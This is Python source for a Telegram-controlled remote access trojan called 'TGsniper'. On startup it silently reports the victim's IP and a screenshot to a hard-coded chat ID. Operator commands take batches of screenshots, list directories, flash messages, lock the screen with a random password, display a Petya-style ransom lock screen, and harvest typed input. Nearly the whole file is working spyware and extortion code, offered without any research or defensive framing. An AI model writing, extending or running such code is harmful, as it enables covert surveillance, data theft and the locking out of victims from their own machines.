import time
import telebot
import pyautogui
import os
import sys
import random
import subprocess
import lock_screen
from datetime import datetime
import socket
import petya_screen_topmost
import cv2
import getin

f = open('mtocen.txt', 'r')

token = f.read()

f.close()

try:
    f = open('id.txt', 'r')
    id = f.read() #1919930125
    f.close()
except:
    f = open('id.txt', 'w')
    f.write("1919930125")
    f.close()
anti_kill = True

bot = telebot.TeleBot(token)
      
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
s.close()

now = datetime.now()
timeing = now.strftime("%H:%M:%S")
bot.send_message(id, "Бот пыл запущен в "+str(timeing)+"!\nIP: "+str(ip))
pyautogui.screenshot("new_screen.png")
scr = open("new_screen.png", 'rb')
bot.send_photo(id, scr)
scr.close()
os.remove("new_screen.png")

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    def take_a_video():
        cap = cv2.VideoCapture(0)
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_FRAME_WIDHT, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        codec = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter("vtosend.avi", codec, 30.0, (1280, 720))

        while True:
            ret, frame = cap.read()
            out.write(frame)

            time.sleep(10)

            break
        out.release()
        cap.release()
    def send_msg(text):
        print(message.from_user.id)
        subprocess.call(f'msg.exe * "{text}"')
    def send(message, text):
        bot.send_message(message.from_user.id, text)
    text = message.text
    def getinput():
        getin.run()
        ftpr = open('comment.txt', 'r')
        send(message, ftpr.read())
        ftpr.close()
        os.remove('comment.txt')
    if text == "/start":
        send(message, "Бот успешно запущен!")
    elif text == "/help":
        send(message, '''/help - lol
/screen - take a photo
/last_20_screens - take 20 photos
/message <text>- send message
/list_dir <dir> - list selected dir
/set_id userid - set user id to default
/lockscreen - block with RGB lights
/lockscreenpass - lock with random password
/petya - lock with petya screen
/get_input
/exit - exit from TGsniper
        ''')
    elif text == "/info":
        send(message, "Error info data!")
    elif text == "/screen":
        pyautogui.screenshot("new_screen.png")
        scr = open("new_screen.png", 'rb')
        bot.send_photo(message.from_user.id, scr)
        scr.close()
        os.remove("new_screen.png")
    elif text == "/last_20_screens":
        for i in range(0, 20):
            pyautogui.screenshot("new_screen.png")
            scr = open("new_screen.png", 'rb')
            bot.send_photo(message.from_user.id, scr)
            scr.close()
            os.remove("new_screen.png")
    elif "/message" in text:
        try:
            msg = text.split(' ')
            new_msg = ""
            for i in range(0, len(msg)-1):
                new_msg += msg[i+1] + " "
            send_msg(new_msg)
        except:
            send(message, "Error sending!")
    elif text.split(' ')[0] == "/list_dir":
        fill_spl = text.split(' ')
        fill_dir = ""
        for i in range(0, len(fill_spl)-1):
            fill_dir += fill_spl[i+1]
        try:
            dirr = os.listdir(path=fill_dir)
            for dirsss in dirr:
                send(message, dirsss)
        except:
            send(message, f"Error listing!\nCannto find: {fill_dir}")
    elif text == "/lockscreen":
        lock_screen.lockscreen()
    elif text == "/lockscreenpass":
        password_from_random = str(random.randint(1111111111111111, 9999999999999999))
        send(message, password_from_random)
        lock_screen.lockscreen_pass(password_from_random)
    elif text == "/exit":
        while True:
            sys.exit()
    elif text.split(' ')[0] == "/set_id":
        f = open('id.txt', 'w')
        f.write(text.split(' ')[1])
        f.close()
    elif text == "/petya":
        petya_screen_topmost.run()
    elif text == "/get_input":
        getinput()
        
bot.polling(none_stop=True, interval=0)